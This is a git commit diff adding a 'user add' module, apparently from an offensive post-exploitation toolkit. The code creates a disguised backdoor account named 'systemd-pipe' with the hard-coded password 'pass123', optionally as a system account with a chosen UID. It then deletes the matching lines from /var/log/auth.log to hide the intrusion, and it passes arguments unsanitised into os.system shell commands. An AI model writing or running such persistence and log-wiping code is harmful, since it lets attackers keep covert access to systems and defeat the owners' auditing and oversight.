69438a3c1572e251dea818b627f9b9b8fa4e7c0a
dd <54325660+sud0k1ller@users.noreply.github.com>
2021-03-24 10:24:24 +0100

    Simple user add module

--- modules/add_user.py
+++ modules/add_user.py
@@ -8,17 +8,33 @@
 
 import os
 
-def main(arguments):
-    command_string = "adduser "
-    if arguments[0] == "":
-        command_string += "systemd-pipe "
-    if arguments[1] != "":
-        pass
-        #TODO command_string += ""
-    if arguments[2] != "":
-        command_string += "--uid=" + str(arguments[2]) + " "
+def create_command_string(arguments):
+    command_string = "useradd "
+    
     if arguments[3] == "yes":
         command_string += "--system "
+    
+    if arguments[1] == "":
+        command_string += "--password $(openssl passwd -6 pass123) " #password = pass123
+    else:
+        command_string += "--password $(openssl passwd -6 " + arguments[1] + ") "
+    
+    if arguments[2] != "":
+        command_string += "--uid " + str(arguments[2]) + " "
+    
+    if arguments[0] == "":
+        command_string += "systemd-pipe"
+    else:
+        command_string += arguments[0]
 
-    os.system(command_string)
+    return command_string
 
+def clear_logs(arguments):
+    if arguments[0] != "":
+        os.system("sed -i '/name=" + arguments[0] + "/d' /var/log/auth.log")
+    else:
+        os.system("sed -i '/name=systemd-pipe/d' /var/log/auth.log")
+
+def main(arguments):
+    os.system(create_command_string(arguments))
+    clear_logs(arguments)
